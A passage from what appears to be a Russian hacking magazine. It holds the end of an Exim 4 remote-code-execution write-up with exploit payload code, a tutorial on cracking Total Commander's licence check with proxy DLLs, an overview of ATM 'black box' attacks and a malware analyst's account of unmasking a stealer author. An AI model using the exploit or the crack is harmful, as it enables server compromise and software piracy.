ка. Так, acl_smtp_mail ука зывает на строку acl_check_mail, и парсер отра‐
батывает каждый раз, ког да клиент переда ет MAIL. Если име ются раскры‐
ваемые строки, то выполняется их интерпретация.
   Таким образом, нам надо изменить ука затель storeblock на нужную
запись из таблицы ACL.


serv.sendline("AUTH CRAM‐MD5")
payload3 = 'a'*0x2bf0 + p64(0) + p64(0x2021) + p8(0x80)
addr = p16(addr*0x10+4)
serv.sendline(b64encode(payload3)+b64encode(addr)[:‐1])

Проблема тут в том, чтобы определить, где рас положена эта таблица. Как ты
знаешь, адресное прос транство — штука динамическая и реальный адрес
зависит от множества факторов. К счастью, его можно получить методом
брутфорса, потому что после указания адреса нужно выполнить smtp_reset,
освободить чанк. Как обычно, это делается с помощью команды EHLO.


serv.sendline("ehlo crash")

И если в этот момент указатель был неверный, то приложение упадет с ошиб‐
кой и коннект клиента с сервером разорвется. Перебирая адреса и отсле‐
живая коннект с сервером, можно определить верный адрес.
  Я буду использовать команду MAIL, и в моем случае адрес можно пос‐
мотреть в отладчике.





        Смот рим адрес рас положения таблицы ACL в отладчике


addr = 0x6c9

Записываем ACL:


payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0‐0x10) + p64(0xb0) + p64(
0x1f40)
payload4 += 't'*(0x1f80‐len(payload4))
serv.sendline("AUTH CRAM‐MD5")
serv.sendline(b64encode(payload4)+'ee')

Генерируем строку с вызовом произвольной команды.


command = "/usr/bin/touch /tmp/owned"
payload5 = "a"*0x78 + "${run{" + command + "}}\x00"
serv.sendline("AUTH CRAM‐MD5")
serv.sendline(b64encode(payload5)+"ee")





           Внедренная в acl_check_mail рас крываемая строка

Мы привязали раскрываемую строку ${run{/usr/bin/touch /tmp/owned}},
которая будет парситься и выполнять ся при каждом поступлении команды
MAIL. Проверим это.


serv.sendline("MAIL FROM: <test@test.com>")





           Успешная эксплуата ция Exim 4. Команда выпол нена

Файл на месте, а значит, экспло ит отра ботал на ура.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Интересно, что в статье об Exim в «Википедии» отдельным абзацем указано,
что приложение крайне безопасно и имеет очень мало критичес ких уяз‐
вимостей. И тут на тебе: за нес колько месяцев такие проблемы! :) Нес колько
критических уязвимостей, экс плуатация которых воз можна удаленно, —
это сильно. Будем надеяться, что раз работчики отнесутся серьезнее к про‐
верке исходного кода. А пока обновляйся: с Exim версии 4.90.1 уязвимость
исправлена.
  Сам эксплоит с воз можностью брутфорса адреса ты сможешь най ти
на GitHub.





  Успешная эксплуатация Exim 4 с помощью брутфорса адреса. Команда
  /usr/bin/touch /tmp/success выполнена

Надеюсь, статья помогла тебе разобраться в деталях уязвимости и немного
прокачать скилл работы с бинарными багами.
ВЗЛОМ





                                                                         OnLyOnE
                                                                                       onlyone.rnd@gmail.com

ТОТАЛЬНЫЙ
РАЗГРОМ
РЕВЕРСИМ TOTAL COMMANDER
И ВЗЛАМЫВАЕМ ЗАЩИТУ ВСЕХ ВЕРСИЙ




Total Commander (ранее Windows Commander) — популяр‐
ный файловый менеджер  с  гра фическим интерфейсом
для Windows. В интернете на варезных сайтах можно найти
множес тво решений для взлома  Total’а. Их неизменный
недостаток — кос тыльность: с выходом новой версии надо
проделывать ту же процедуру «лечения» программы вновь
и вновь. Но можно и по‐другому. Хочешь узнать как и заодно
прокачать скиллы в реверсе? Читай эту статью!


             GREETING

                      Вначале хочу поблагодарить сво их товарищей
                        с сайта exelab.ru и передать привет:
                  •Jupiter,
                  •Mak,
                  •VodoleY,
                  •ELF_7719116,
                  •Kindly

                      и многим другим. Спасибо!


Какое‐то время назад мой друг Jupiter предложил вместе разобрать алгоритм
лицензирования Total’а. Пораскинув мозгами, мы написали генератор лицен‐
зии — файлов‐ключей. И все было бы замечательно, если бы не присутствие
в основе алгоритма лицензирования криптосистемы с открытым ключом —
LUC. И клю чи, разумеется, для успешного прохож дения лицензирования нуж‐
но знать.
   LUC — это похожая на RSA криптосистема. Ее отличие от RSA заключа‐
ется в использовании пос ледова тельнос тей Люка вместо возведения в сте‐
пень. Как и для RSA, для генерации закрытого клю ча необходимо знать мно‐
жители (P и Q), которые можно получить через факторизацию модуля (N).
Но в нашем случае длина модуля — 832 бита. Естес твенно, ни у меня, ни у
Jupiter’а таких вычислительных мощностей нет. А на квантовый компьютер мы
еще денег не накопили. :)
   Для решения этой проб лемы мы сами сгенерируем приватный и пуб‐
личный ключ криптоалгоритма LUC. Приватным зашифруем лицензию, пуб‐
личным программа будет рас шифровывать лицензию. А чтобы публичный
ключ проходил, мы пропатчим его в памяти.
   Помимо LUC, в  Total’е присутс твуют механизмы самозащиты, защита
от модификации исполняемо го файла. Можно, конечно, хардкорно запатчить
файл, но это как раз и есть «кос тыль», который лиша ет обход защиты универ‐
сальности.


            WARNING

                        Статья публикуется в образовательных  целях.
                       Редак ция не несет ответственности за любой
                         вред, причинен ный материалами данной  пуб‐
                        ликации. В статье намеренно не рассматрива ется
                      сам алгоритм лицензирования, а демонстрируют‐
                        ся практические аспекты имплементации обхода
                     защиты с помощью техники proxy DLL.



ЧТО ДЕЛАЕМ?
Наша задача — заменить модуль (N) в исполня емом фай ле программы,
не нарушая его целостнос ти. Тогда наш сгенерированный файл ключа будет
верно расшифро ван и программа будет зарегис трирована.
   Существует два варианта решения данной задачи:
 1. Написать загрузчики для х86‐ и х64‐версий прог раммы (Loader).
 2. Написать proxy DLL, которые будут выполнять ту же функцию, что и заг‐
   рузчики.

Оба варианта позволяют беспрепятственно обновлять программу. Но я
выбираю второй вариант, он более удоб ный. В этом варианте не нужно будет
исправлять пути в свой ствах ярлыков программы с исполняемого файла To‐
 tal’а на наш лоадер. Дос таточно просто скопиро вать DLL’ки и файл ключа
в папку с установленной прог раммой.


ИНСТРУМЕНТЫ
 • x64dbg — отладчик;
 • masm x32 — компилятор;
 • masm x64 — компилятор;
 • wincmd.key — ключ для программы, сгенерированный моим с Jupiter’ом
   кейгеном.



                                      Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ТОТАЛЬНЫЙ РАЗГРОМ
                   РЕВЕРСИМ TOTAL COMMANDER
            И ВЗЛАМЫВАЕМ ЗАЩИТУ ВСЕХ ВЕРСИЙ





ПРОЦЕСС
Я скачал с официального сайта последнюю бета‐версию, включающую в себя
обе версии программы (х86 и х64). Уста новил в директорию, которую пред‐
ложил инсталлятор (C:\totalcmd).





                        Ус тановленные файлы

Теперь запускаем на выбор TOTALCMD.EXE или TOTALCMD64.EXE, без раз‐
ницы. Получаем вот такое окно.





Это было ожидаемо.  ;) Теперь запус каем Total под отладчиком и заходим
в закладку Symbols.





В левой половине окна видим загруженные в память процесса модули (DLL).
Из всех модулей нас интересу ют только две динамические биб лиотеки —
это version.dll и winspool.drv.
   Пусть тебя не смущает, что у winspool.drv рас ширение не dll, на самом
деле внутренняя структура у winspool.drv как у обычной динамической биб‐
лиотеки. Эти два модуля и будут кандидатами для написания одноименных
proxy DLL для Total’а.


             INFO

                Мы пишем два модуля потому, что у нас две вер‐
                      сии программы: х86 и х64. Для каждой версии мы
                     будем использовать proxy DLL соответствующей
                       разрядности.


Как работа ет механизм proxy DLL
В основе механизма proxy DLL лежит осо бенность загрузки модулей (DLL)
в память процесса Windows загрузчиком (NTLDR или NT Loader).
  В Windows‐загрузчике этим занимается API LdrLoadDll, который находит‐
ся в модуле ntdll.dll. Обертками этого API служат такие API, как LoadLi‐
brary и LoadLibraryEx.
  Один из этапов загрузки исполняемого файла (в нашем случае это модуль
с расширением EXE) — это заполнение таб лицы импорта исполняемого фай‐
ла адресами API из DLL, необходимых для работы программы. В начале этого
процесса LdrLoadDll начинает искать модуль (DLL) по име ни файла, к при‐
меру version.dll, который находится в таблице импорта в виде строки
в кодиров ке ASCII. LdrLoadDll ищет DLL в текущей директории соз данного
процесса, в нашем случае это C:\totalcmd. Далее, если модуль не был най‐
ден, в зависимости от битности про цес са (х86 или х64) LdrLoadDll продол‐
жает поиск требуемой DLL в системной директории (C:\Windows\System32
или C:\Windows\SysWOW64). Если и в сис темной директории модуль не будет
найден, мы получим сооб щение об ошиб ке.
   LdrLoadDll позволя ет загружать в адресное пространство созданного
процесса модули, имеющие одно и то же название, из разных директорий.
К примеру, в нашем случае proxy DLL загружает в память NTLDR из дирек‐
тории, где находится TOTALCMD.EXE, а оригинальную DLL (из системной
директории) мы  загружа ем  в  память  из  proxy  DLL  с помощью  API
LoadLibrary, передавая ей в качестве парамет ра абсолютный путь к ори‐
гинальной DLL. Это еще один нюанс, который позволяет реализовать
механизм proxy DLL. Далее из приведенного кода proxy DLL ты поймешь,
как это работает. :)


Продолжаем. В процессах TOTALCMD.EXE и TOTALCMD64.EXE обе DLL при‐
сутствуют. Для TOTALCMD.EXE мы будем использовать version.dll, а для
TOTALCMD64.EXE — winspool.drv.
  В Total’е модуль (N), учас тву ющий в рас шифровке файла ключа (wincmd.
key), име ет вид строковой константы в кодировке ASCII:


AAD4474DC8387E81BB095D810F4F4F21D5D7CCC756E3D6E5DEE48AC000C25AA0EFAD0
AD3A5AC46F15B50249597461BBB87CDC3F1BA37C17A9A207A3603E38E718F99
27A5EB38005D8B72EAFDC63931C3D93C1FAD457A17CA85BEB40F3FA9152770D
AC12E8E3B912D

Его необходимо, для правиль ной рас шифровки нашего ключа, заменить
на наш модуль (N):


E813039FB5F248DDA582F1C411D3B5B7A4C97CBB6982388EB354A8B78324A6A7B494A
BAB4A0A97728BAC585FCD856D2173F4C3ADE89E8176AE53F7BF7AEC39FCACEC
907829B31FE1C3BB3E2E4C30925525655F967B52A0318FCE0BA0BAE065D8A68
DBE86167F67A1

Теперь вновь по очереди запус каем под отладчиком обе версии программы,
чтобы определить, где (в какой секции исполня емого файла) находится иско‐
мый модуль (N).
   Итак, запускаем х86‐версию и перехо дим в закладку Memory Map.
Нажимаем сочетание клавиш Ctrl + B, откро ется окно бинарного поиска
в памяти процесса, копиру ем оригинальный модуль (N) и вставляем его
в поле ASCII.





Нажимаем OK, и у нас откроется закладка References с результатами поиска.





Видим адрес, по которому был найден модуль (N), — 0x004E219C.





Переходим в окно дампа памяти по данному адресу и скроллом поднимаемся
вверх.





Видим адрес 0x00401000. Это вер хний адрес секции, в которой находится
модуль (N).
   Опять возвращаемся в  закладку Memory Map и видим,  что адрес
0x00401000 соответству ет адресу пер вой секции исполняемого файла TO‐
TALCMD.EXE — CODE.





Для х64‐версии проделываем те же самые манипуляции с отладчиком.
  В результате выясняем, что ASCII‐строка модуля (N) для х86‐версии
находится в сек ции CODE (0x00401000), а для х64‐версии — в секции .data
(0x0000000000AD9000).
   Ну что же, необ ходимую информацию для написа ния proxy DLL мы получи‐
ли. Начинаем кодить. :)


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ТОТАЛЬНЫЙ РАЗГРОМ
                   РЕВЕРСИМ TOTAL COMMANDER
            И ВЗЛАМЫВАЕМ ЗАЩИТУ ВСЕХ ВЕРСИЙ





КОДИНГ
Разберем код для х86‐версии, а имен но version.dll. Для х64‐версии все
аналогично. Точка входа proxy DLL (EntryPoint). Здесь все стандартно.





API DisableThreadLibraryCalls использовать не обязательно. Я поль‐
зовал ся им для отключения уведомлений DLL_THREAD_ATTACH и DLL_THREAD‐
_DETACH, на всякий случай.
  Далее переходим в MainProc.





Здесь я объявляю глобальные переменные, для сохранения адре сов ори‐
гинальных API.
  Резервирую область памяти для сохранения полученного пути к ори‐
гинальной version.dll.





Здесь я прокомментировал все шаги исполнения кода MainProc.





Чуть ниже MainProc я объявляю экспортируемые функции с безусловны ми
переходами (JMP) из proxy DLL в оригинальную DLL. В файле version.def
определены име на экспортиру емых функций proxy DLL, которые аналогичны
именам функций в оригинальной DLL.


LIBRARY version
EXPORTS
GetFileVersionInfoA=__GetFileVersionInfoA@0
GetFileVersionInfoByHandle=__GetFileVersionInfoByHandle@0
GetFileVersionInfoExW=__GetFileVersionInfoExW@0
GetFileVersionInfoSizeA=__GetFileVersionInfoSizeA@0
GetFileVersionInfoSizeExW=__GetFileVersionInfoSizeExW@0
GetFileVersionInfoSizeW=__GetFileVersionInfoSizeW@0
GetFileVersionInfoW=__GetFileVersionInfoW@0
VerFindFileA=__VerFindFileA@0
VerFindFileW=__VerFindFileW@0
VerInstallFileA=__VerInstallFileA@0
VerInstallFileW=__VerInstallFileW@0
VerLanguageNameA=__VerLanguageNameA@0
VerLanguageNameW=__VerLanguageNameW@0
VerQueryValueA=__VerQueryValueA@0
VerQueryValueW=__VerQueryValueW@0

И главная функция proxy DLL — это ReplaceModulus.





В секции данных proxy DLL у меня находят ся оригинальный модуль (Original)
и модуль (New), на который необходимо заменить оригинальный.





Здесь тоже все шаги выполнения кода прокомментированы.


ФИНАЛ
Результатом всех описанных действий будет зарегистрированная версия
программы. Причем в данном случае можно спокойно обновлять программу,
не боясь того, что регистрация «слетит». :)
  Копируем в папку с Total’ом три файла — это наш ключ wincmd.key и наши
DLL’ки: version.dll и winspool.drv. Запускаем программу.





В диспетчере задач видим, что в процесс загружены обе DLL’ки.





Радуемся. :)


ИТОГИ
Как видишь, механизм proxy DLL — удоб ный и мощный инструмент. С его
помощью ты можешь бес препятс твенно эмулировать работу оригинальных
функций и при этом комфортно модифи цировать данные и код в памяти про‐
цесса.


Исходни ки и¬ключ
Скачать исходники программы и ключ для самос тоятельной практики ты мо‐
жешь по этой ссылке. Напоминаем, что все материалы выкладываются исклю‐
чительно в образовательных целях. Редакция не несет ответс твенности
за любой вред, причиненный материалами данной статьи.
  Пароль — xakep.ru.
ВЗЛОМ
КАРДИНГ
 И «ЧЁРНЫЕ ЯЩИКИ»

  РАЗБИРАЕМСЯ С ГЛАВНЫМ НА СЕГОДНЯ
   СПОСОБОМ ВЗЛОМА БАНКОМАТОВ





Стоящие  на  ули цах  города  железные
коробки с деньгами не могут не прив лекать
внимание  любителей  быстрой  наживы.
                                                                                 Антон Карев
                                                                                    Эксперт по информационнойИ  если  раньше  для  опустошения  бан‐                                                                                       безопасности. Образование
                                                                                   высшее, специальностькоматов  применяли  чисто  физические                                                                                  «Защита информации в
                                                                                компьютерных системах», вметоды, то теперь в ход идут все более                                                                                 настоящий момент работает
искусные трюки, связанные с компьюте‐       над диссертацией. Область                                                                                     профессиональных
рами.   Сейчас   наиболее   актуальный      интересовразведка, аналитика— технологическаяв сфере
из них — это «черный ящик» с одноплатным          ИБ, искусственныйинтеллект.
микрокомпьютером внутри. О том, как он           vedacoder@mail.ru
работает, мы и поговорим в этой статье.


Типичный банкомат — это набор готовых электромеханических компонентов,
размещенных в одном корпусе. Производители банкоматов собирают их
из устройства выдачи банкнот, считыва теля карт и дру гих компонентов, уже
разработанных  сторонними  пос тавщиками.  Эта кий  конс труктор LEGO
для взрослых. Готовые компоненты размещаются в корпусе банкомата,
который обычно состоит из двух отсеков: верхнего («кабинета» или «зоны
обслуживания») и нижнего (сейфа). Все электромеханичес кие компоненты
подклю чены через порты USB и COM к системному блоку, который в данном
случае играет роль хоста. На ста рых моделях банкоматов также можно встре‐
тить соединения через SDC‐шину.


             INFO

                     Начальник международной ассоциации произво‐
                       дите лей банкоматов (ATMIA) выделил «черные
                   ящики» как наиболее серьезную угрозу для бан‐
                        коматов.



ЭВОЛЮЦИЯ БАНКОМАТНОГО КАРДИНГА
Сначала кардеры эксплу атировали только грубые физические недостатки
защиты банкоматов — использовали скиммеры и шиммеры для кражи данных
с  магнитных  полос, поддельные ПИН‐пады и камеры  для просмотра
ПИН‐кодов и даже под дельные банкоматы. Затем, когда банкоматы стали
оснащать унифицированным софтом, работа ющим по единым стандартам,
таким как XFS (eXtensions for Financial Services), кардеры начали атаковать
банкоматы  компьютерными  вируса ми. Среди  них  Trojan.Skimer,  Back‐
door.Win32.Skimer, Ploutus, ATMii и другие име нованные и безымянные злов‐
реды, которых кардеры подсаживают на хост банкомата либо через загрузоч‐
ную флешку, либо через TCP‐порт уда лен ного управления.





                    Схема заражения банкомата

Захватив XFS‐подсистему, малварь может без авто ризации отдавать коман‐
ды устройству выдачи банкнот или картридеру: читать магнитную полосу бан‐
ковской карты, писать на нее и даже извлекать историю транзакций, хранящу‐
юся на чипе EMV‐карты. Особого внимания заслуживает EPP (Encrypting PIN
Pad — шифрованный ПИН‐пад). Принято считать, что вводимый на нем
ПИН‐код не может быть перехвачен. Однако XFS позволяет использовать EPP
в двух режимах: открытом (для вво да раз личных чис ловых параметров, таких
как сумма, которую надо обналичить) и безопас ном (в него EPP переключа‐
ется, когда надо ввести ПИН‐код или ключ шифрования). Эта особенность
XFS позволяет кардеру устроить MITM‐ата ку: перехватить команду активации
безопасного режима, которая отправляется с хоста на EPP, и затем сообщить
ПИН‐паду, что работу следует продолжить в откры том режиме. В ответ на это
сообщение EPP отправляет нажатия клавиш открытым текстом.





                Принцип действия «черного ящика»

В последние годы, по данным Европола, вредоносы для банкоматов заметно
эволюционировали. Кардерам теперь необязательно иметь физический дос‐
туп  к банкомату,  чтобы заразить  его. Они могут заражать банкоматы
при помощи удален ных сетевых атак, используя для этого корпоративную
сеть банка. По информации Group IB, в 2016 году более чем в десяти странах
Европы на банкоматы были совершены дистанционные нападе ния.





                Атака на банкомат через удален ный доступ

Антивирусы, блокировка обновления прошивки, блокировка USB‐портов
и шифрование жесткого диска до некото рой степени защищают банкомат
от вирусных атак кардеров. Но что, если кардер не атакует хост, а напрямую
подклю чается к периферии (через RS232 или USB) — к считывателю карт,
ПИН‐паду или устрой ству выдачи наличных?


ПЕРВОЕ ЗНАКОМСТВО С «ЧЕРНЫМ ЯЩИКОМ»
Сегодня технически подкованные кардеры поступают именно так, используя
для кражи наличных из банкомата так называ емые «черные ящики» — спе‐
цифически запрограммированные одноплатные микрокомпьютеры, наподо‐
бие Raspberry Pi. «Черные ящики» опустошают банкоматы под чистую, совер‐
шенно волшебным (с точки зрения банкиров) образом. Кардеры подключают
свое устройство напрямую к устройству выдачи банкнот и извлекают из него
все деньги. Такая атака действует в обход всех прог раммных средств защиты,
развернутых на хосте банкомата (антивиру сы, контроль целос тности, полное
шифрование диска и про чее).





                  «Чер ный ящик» на базе Raspberry Pi

Крупнейшие производители банкоматов и правительственные спецслужбы,
столкнувшись с несколькими реализаци ями «черного ящика», сообщают, что
эти хитроумные компьютеры заставляют банкоматы выплевывать все дос‐
тупные наличные, по сорок банкнот каждые двадцать секунд. Также спецслуж‐
бы предупреждают, что кардеры чаще всего нацеливаются на банкоматы
в аптеках, торговых центрах и банкоматы, которые обслу живают автомоби‐
листов «на ходу».
  При этом, что бы не светиться перед камера ми, наиболее осторожные кар‐
деры берут на помощь какого‐нибудь не слишком ценного партнера, «мула».
А что бы тот не смог присвоить «черный ящик» себе, применяется следующая
схема. Из «черного ящика» убирают ключевую функциональность и под клю‐
чают к нему смартфон, который используют в качес тве канала для дис танци‐
онной передачи команд урезанному «черному ящику» по IP‐протоколу.





   Модификация «черного ящика» с активацией через удаленный доступ

Как это выглядит с точ ки зрения банкиров? На записях с виде окамер‐фик‐
саторов происходит примерно следующее: некая личность вскры вает вер‐
хний отсек (зону обслуживания), подключает к банкомату «вол шебный ящик»,
закрывает верхний отсек и уходит. Немного погодя несколько человек, на вид
обычные клиенты, подходят к банкомату и снимают огромные суммы денег.
Затем кардер возвращается и извлекает из банкомата свое маленькое вол‐
шебное устройство. Обычно факт ата ки банкомата «черным ящиком» обна‐
руживается только через несколько дней, когда пус той сейф и журнал снятия
наличных не сов падают. В результате сотрудни кам банка ос тается только
чесать затылки.


АНАЛИЗ БАНКОМАТНЫХ КОММУНИКАЦИЙ
Как уже отмечалось выше, системный блок и периферийные устройства вза‐
имодействуют через USB, RS232 или SDC. Кардер подключается непосредс‐
твенно к порту периферийного устройства и отправляет ему команды —
в обход хоста. Это довольно прос то, потому что стандартные интерфейсы
не требуют каких‐то специфичес ких драйверов. А проприетарные протоколы,
по которым периферия и хост вза имодействуют, не требуют авторизации
(ведь устройство же находится внут ри доверенной зоны), так что эти незащи‐
щенные протоколы, по которым периферия и хост взаимодействуют, легко
прослушиваются и легко поддаются атаке вос произведения.
   Таким образом, кардеры могут использовать программный или аппарат‐
ный анализатор трафика, подключая его напрямую к порту конкретного
периферийного устройства  (например,  к счи тыва телю  карт) для сбора
передаваемых данных. Пользуясь анализатором трафика, кардер узнаёт все
технические подробности работы банкомата, в том чис ле недокументирован‐
ные функции его периферии (например, изменение прошивки периферий‐
ного устройства). В результате взломщик получа ет полный контроль над бан‐
коматом. При этом обна ружить наличие анализатора трафика довольно‐таки
трудно.
  Прямой контроль над устройством выдачи банкнот означает, что кассеты
банкомата могут быть опус тошены без какой‐либо фиксации в логах, которые
в штатном режиме вносит софт, разверну тый на хос те. Для тех, кто не знаком
с программно‐аппаратной архитектурой банкомата, это может выглядеть
как магия.


ОТКУДА БЕРУТСЯ «ЧЕРНЫЕ ЯЩИКИ»?
Поставщики банкоматов и субподрядчики раз рабатывают отладочные ути‐
литы для диагностики аппаратной части банкомата, в том числе электромеха‐
ники, отвечающей за снятие наличных. Среди таких утилит ATMDesk, RapidFire
ATM XFS. На рисунке ниже представлены еще нес колько таких диагностичес‐
ких тулз.





                  Панель управления ATMDesk





               Панель управления RapidFire ATM XFS





    Сравнительные характеристики нескольких диагности ческих утилит

Доступ к подобным утилитам в норме ограничен персонализированными
токенами, и работают они только при откры той дверце банкоматного сейфа.
Однако, просто заменив в бинарном коде ути литы несколько байтов, хакеры
могут «протестировать» снятие наличных — в обход проверок, пре дусмотрен‐
ных производителем утилиты. Кардеры устанавлива ют такие модифицирован‐
ные утилиты на свой ноутбук или одноплатный микрокомпьютер, которые
затем подклю чают непосредс твенно к устрой ству выдачи банкнот.


«ПОСЛЕДНЯЯ МИЛЯ» И ПОДДЕЛЬНЫЙ ПРОЦЕССИНГОВЫЙ ЦЕНТР
Прямое взаимодействие с периферией без общения с хос том — это только
один из эффективных приемов кардинга. Другие приемы основываются
на том, что у нас есть широкое разнообразие сетевых интерфейсов, через
которые банкомат связывается с внеш ним миром, — от X.25 до Ethernet
и сотовой связи. Многие банкоматы могут быть идентифици рованы и локали‐
зованы при помощи сервиса Shodan (наиболее лаконичная инструкция по его
использованию представлена здесь) — с последу ющей атакой, парази тиру‐
ющей на уязвимой конфигурации безопасности, лени админис тратора и уяз‐
вимых коммуникациях между различными подразделениями банка.
   «Последняя миля» свя зи между банкоматом и процес синговым центром
богата самыми разнооб разными технологиями, которые могут служить точкой
входа для кардера. Встречаются проводные (телефонная линия или Ethernet)
и беспроводные (Wi‐Fi, сотовая связь: CDMA, GSM, UMTS, LTE) способы свя‐
зи. Механизмы безопасности могут включать в себя:
 • аппаратные или программные средства для поддержки VPN (как стандар‐
   тные, встроенные в ОС, так и от сторонних про изводите лей);
 • SSL/TLS (как специфичные для конкретной модели банкомата, так и от
   сторонних производителей);
 • шифрование;
 • аутентификацию сооб щений.

Однако похоже, что для банков перечис ленные технологии представляются
очень сложными, поэто му они не утруждают себя специальной сетевой
защитой или реализуют ее с ошибками. В лучшем слу чае банкомат связыва‐
ется с VPN‐сервером и уже внутри приватной сети подключается к процес‐
синговому центру. Кроме того, даже если у банков и получится реализовать
перечисленные выше защитные механизмы, у кардера уже есть эффективные
атаки против них. Так что, даже если безопас ность соответству ет стандарту
PCI DSS, банкоматы все равно оста ются уязвимыми.
  Одно из основных требова ний PCI DSS — все конфиденциальные данные,
когда они передаются через общедос тупную сеть, должны быть зашиф‐
рованы. И ведь у нас действительно есть сети, которые изначально были
спроектированы так, что в них данные полностью зашифрованы! Поэтому
есть соблазн сказать: «У нас данные зашифрованы, потому что мы исполь‐
зуем Wi‐Fi и GSM». Однако многие из этих сетей не обеспечивают достаточ‐
ной защиты. Сотовые сети всех поколений уже давно взломаны. Окончатель‐
но и бесповоротно. И даже есть поставщики, которые предлагают устройства
для перехвата передаваемых по ним данных.
  Поэтому либо в небезо пасной ком муникации, либо в «приватной» сети,
где каждый банкомат широко вещает о себе другим банкоматам, может быть
инициирована MITM‐атака «поддельный процес синговый центр», которая
приведет к тому, что кардер захватит контроль над потоками данных, переда‐
ваемыми между банкоматом и процессинговым центром.
   Таким  MITM‐атакам  потенциально  подвержены  тысячи  банкоматов.
На пути к подлинному про цес синговому центру хакер вставляет свой, под‐
дельный. Этот поддельный про цес синговый центр дает банкомату команды
на выдачу банкнот. При этом кардер настраивает свой процес синговый центр
таким образом, чтобы наличные выдавались вне зависи мости от того, какая
карта вставляется в банкомат, — даже если срок ее дей ствия истек или на
ней нулевой баланс. Главное, что бы поддельный процессинговый центр
«узнал» ее. В качестве поддельного процес синго вого центра может быть
либо кустарная поделка, либо симулятор про цес сингового центра, изначаль‐
но разработанный для отладки сетевых настро ек (еще один подарок «про‐
изводителя» кардерам).
  На следующем рисунке приведен дамп команд на выдачу сорока банкнот
из четвертой кассеты, отправленных из поддель ного процессингового центра
и хранящихся в журналах ATM‐софта. Они выглядят почти как нас тоящие.





          Дамп команд поддельного процессингового центра


ЗАКЛЮЧЕНИЕ
Как видишь, классическая максима «по‐нас тоящему защищенный компьютер
находится в железном ящике и не подключен ни к какой сети, в том чис ле
электрической» с каждым годом находит все новые и новые подтверждения.
Уязвимо все, и банковское имущество не исключение.
ВЗЛОМ
ОХОТА


 НА ЕНОТА


      КАК ВИРМЕЙКЕР СПАЛИЛСЯ САМ
        И СПАЛИЛ ЗАКАЗЧИКОВ




Истории о том, как антивирусные компании
вычисляют    вирусо писа телей,    всегда
вызывают неподдельный интерес у самой
разной аудитории. Даже несмотря на то,
что в большинс тве случаев такого рода          Павел Шалин                                                                                           Аналитик, «Доктор Веб»
разоблачения происходят потому, что вир‐
мейкер где‐то фундаментально накосячил.
Так вышло и на этот раз, причем автор тро‐
яна не то чтобы подставился сам, но знатно
спалил своих клиентов, на радость спе‐
циалистам по информа ционной безопас‐
ности. Собственно, случай, о котором пой‐
дет речь, наглядно иллюстрирует, как про‐
водятся расследова ния подобных инциден‐
тов и какую информа цию можно получить,
обратив  внимание  на  незначительные,
казалось бы, детали.


Началось все с того, что к нам в вирлаб пос тупило несколько семплов тро‐
янца‐стилера, отличающихся друг от друга рядом техничес ких деталей,
но явно созданных одним и тем же автором. Трой имел стандартный
для подобного софта набор функций: поиск и сбор сохраненных паролей
и файлов cookies из бра узеров, копирование текстовых файлов, картинок
и документов по списку, кража паролей из FTP‐клиентов, а также учеток
от «Телеграма» и клиента Steam. Все, что нажито непосильным трудом, сти‐
лер упаковывал в архив и заливал в облачное хранилище: в одной из вер‐
сий — на Яндекс.Диск, в более поз дних модификациях — на pCloud.



      Говорят, здоровый смех прод лева ет жизнь. Если это в действитель-
      нос ти так, то, ана лизируя полученные образцы стилеров, вирус ные
      ана литики явно выиграли пару‑тройку дополнительных лет

Одна из ранних редакций трояна распространялась через видеохостинг
YouTube — по ссылкам в коммента риях, оставленных с нес кольких фейковых
аккаунтов. При этом ролики посвящались использованию читов и трейнеров
в популярных играх, а по ссылкам якобы можно было скачать эти при ложе ния.
То есть кампания, по всей видимос ти, была рас считана на игроков‐читеров,
а одной из целей предположитель но был угон аккаунтов Steam. Ссылки
на вредоносный софт также активно рекламировались в твиттере.





Еще одна модификация трояна была многокомпонентной: помимо основного
шпионского модуля, в его состав входил написанный на Go сканер, опре‐
делявший путь к установленным в системе браузерам, и отдельная утилита,
запаковывающая краденые файлы в архив и заливавшая их в облако. Дроп‐
пер троя был выпол нен на AutoIt, что само по себе доставило исследова‐
телям отдельный ни с чем не сравнимый фан. Для рас пространения этого
трояна злодеи придумали весьма ори гинальный метод: они связывались
с владельцами популярных Telegram‐каналов, которым предлагали прорек‐
ламировать программу для подключения к Telegram одновре менно с нес коль‐
ких аккаунтов. Приложение можно было про тес тировать — для этого потен‐
циальной жертве присылали ссылку на исполня емый файл, в котором пря тал‐
ся троян.





Что же касается самих стилеров, то все без исклю чения исследованные нами
семплы оказались написаны на Python и сконвертированы в исполняемый
файл с помощью py2exe. При этом код тро янов ока зался кривой, как фрук‐
товый нож, и такой же тупой. Взять, к примеру, питоновскую функцию os.
listdir(), возвращающую список строк, каждая из которых пред ставляет
собой имя дирек тории. Обычно полученные зна чения этой функции парсятся
в цикле. Однако автор трояна зачем‐то формировал из списка строку с про‐
белами‐разделителями и искал в ней нужные вхождения по заданному шаб‐
лону с использованием регулярного выражения:


steam = os.listdir(steampath)
steam = ' '.join(steam).decode('utf‐8')
ssfnfiles = findall('(ssfn\\d+)', steam)

Говорят, здоровый смех продлевает жизнь. Если это в действительности так,
то, анализируя полученные образцы стилеров, вирусные аналитики явно
выиграли  пару‐трой ку  дополнитель ных  лет,  ибо  смотреть  без  смеха
на подобный чудесный код попросту невозможно:


if score is 0:
    pass
if score is not 0:
    exit(1)

По всей видимости, вирусописа тель пока еще не освоил сложнейшую син‐
таксическую конструкцию if score != 0: exit(1) либо вместо рук у него
из плеч растут лапки. Второе, впрочем, позже пол ностью подтвердилось.
  При компиляции скрипта интерпретатор Python сохраня ет в байт‐коде имя
исходного сце нария. Это имя, полученное нами из экзешника, оказалось
весьма характерным: enotproject. А в дроппере, написанном на AutoIt, сох‐
ранил ся даже путь к пап ке с файлами проекта: \Users\User\Desktop\Racoon
Stealer\build.  Непродолжительный  гуглеж  по  клю чевым  словам  «Енот»
и «Racoon Stealer» привел нас на страничку Lolzteam, где юзер под ником
«Енот Погромист» продает всем желающим те самые трояны, а также про‐
водит мастер‐классы по написа нию стилеров на Python.





Наш «Енот» оказался непростым зверь ком: ко всему прочему он еще и виде‐
облогер, автор канала про разработку вредоносного ПО, и владелец аккаунта
на Гитхабе, куда он выкладывает трояны собственного изготовления в виде
исходников.





Поскольку «Енот» наследил в Сети изрядно, бла годаря его видеороликам
